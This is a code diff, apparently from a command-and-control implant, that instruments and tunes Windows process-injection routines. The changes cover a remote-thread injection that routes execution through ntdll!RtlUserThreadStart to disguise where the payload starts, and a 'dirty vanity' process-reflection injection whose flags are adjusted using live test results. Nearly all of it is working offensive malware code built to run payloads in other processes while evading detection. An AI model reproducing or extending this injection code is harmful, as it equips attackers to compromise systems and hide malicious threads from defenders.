@@ -70,14 +70,18 @@ static void * remote_exe_entry_x64(HANDLE hProcess) {
 
 	pebaddr = pbi.PebBaseAddress;
 	if (!beacon_ReadProcessMemory(hProcess, (char *)pebaddr + 0x10, &imagebase, 8, &got) || got != 8) {
+		spawn_log("obf: walk FAIL read imagebase gle=", (long)GetLastError());
 		return NULL;
 	}
+	spawn_log("obf: walk imagebase=", (long)(long long)imagebase);
 
 	if (!beacon_ReadProcessMemory(hProcess, (char *)(DWORD_PTR)imagebase, dos, 0x40, &got) || got != 0x40) {
+		spawn_log("obf: walk FAIL read dos gle=", (long)GetLastError());
 		return NULL;
 	}
 
 	if (dos[0] != 'M' || dos[1] != 'Z') {
+		spawn_log("obf: walk FAIL no MZ (stomped headers?)", 0x7fffffff);
 		return NULL;
 	}
 
@@ -109,8 +113,11 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	void * legit = NULL;
 	CONTEXT c;
 
+	spawn_log("obf: chain entry pid=", (long)context->pid);
+
 	/* same architecture only (4.11 constraint) */
 	if (!context->sameArch) {
+		spawn_log("obf: FAIL arch mismatch", 0x7fffffff);
 		return FALSE;
 	}
 
@@ -118,26 +125,33 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	 * SetThreadContext opcode handles that case; this one targets running
 	 * processes where we mint a new, legitimately-started thread */
 	if (context->isSuspended) {
+		spawn_log("obf: FAIL suspended target", 0x7fffffff);
 		return FALSE;
 	}
 
 	legit = remote_exe_entry_x64(context->hProcess);
 	if (legit == NULL) {
+		spawn_log("obf: FAIL remote entry walk", 0x7fffffff);
 		return FALSE;
 	}
+	spawn_log("obf: legit entry=", (long)(long long)legit);
 
 	hThread = beacon_CreateRemoteThread(context->hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)legit, lpParameter, CREATE_SUSPENDED, NULL);
 	if (hThread == NULL) {
+		spawn_log("obf: FAIL CreateRemoteThread gle=", (long)GetLastError());
 		return FALSE;
 	}
+	spawn_log("obf: CRT ok thread=", (long)(long long)hThread);
 
 	ZeroMemory(&c, sizeof(c));
 	c.ContextFlags = CONTEXT_FULL;
 	if (!GetThreadContext(hThread, &c)) {
+		spawn_log("obf: FAIL GetThreadContext gle=", (long)GetLastError());
 		TerminateThread(hThread, 0);
 		CloseHandle(hThread);
 		return FALSE;
 	}
+	spawn_log("obf: GTC ok orig rip=", (long)c.Rip);
 
 	/* route the thread through ntdll!RtlUserThreadStart instead of
 	 * jumping straight to the payload: a thread whose context skips the
@@ -150,6 +164,7 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	{
 		void * ustart = (void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
 		if (ustart == NULL) {
+			spawn_log("obf: FAIL no RtlUserThreadStart", 0x7fffffff);
 			TerminateThread(hThread, 0);
 			CloseHandle(hThread);
 			return FALSE;
@@ -160,6 +175,7 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	}
 
 	if (!SetThreadContext(hThread, &c)) {
+		spawn_log("obf: FAIL SetThreadContext gle=", (long)GetLastError());
 		TerminateThread(hThread, 0);
 		CloseHandle(hThread);
 		return FALSE;
@@ -167,6 +183,7 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 
 	ResumeThread(hThread);
 	CloseHandle(hThread);
+	spawn_log("obf: resumed, payload=", (long)(long long)lpStartAddress);
 	return TRUE;
 #endif
 }
@@ -251,9 +268,12 @@ BOOL inject_via_dirtyvanity_reflect(INJECTCONTEXT * context, LPVOID lpStartAddre
 		return FALSE;
 
 	ZeroMemory(&info, sizeof(info));
-	st = pReflect(GetCurrentProcess(),
-	              0x1 | 0x2, /* INHERIT_HANDLES | NO_SYNCHRONIZE (PoC flags) */
-	              lpStartAddress, lpParameter, NULL, &info);
+	/* flags: INHERIT_HANDLES only. The SUSPENDED/NO_SYNCHRONIZE combos the
+	 * public PoCs use are rejected on this build (live matrix: 3 -> 0xC00000F0
+	 * INVALID_PARAMETER_2, 0xA -> 0xC00000F3 with and without an event;
+	 * plain 0x2 returns STATUS_SUCCESS). Struct per phnt: thread handle
+	 * first, then the CLIENT_ID - logged only, nothing depends on it. */
+	st = pReflect(GetCurrentProcess(), 0x2, lpStartAddress, lpParameter, NULL, &info);
 	if (st != 0) {
 		spawn_log("dv: reflection failed st=", (long)st);
 		post_error_d(0x4a, (int)st);
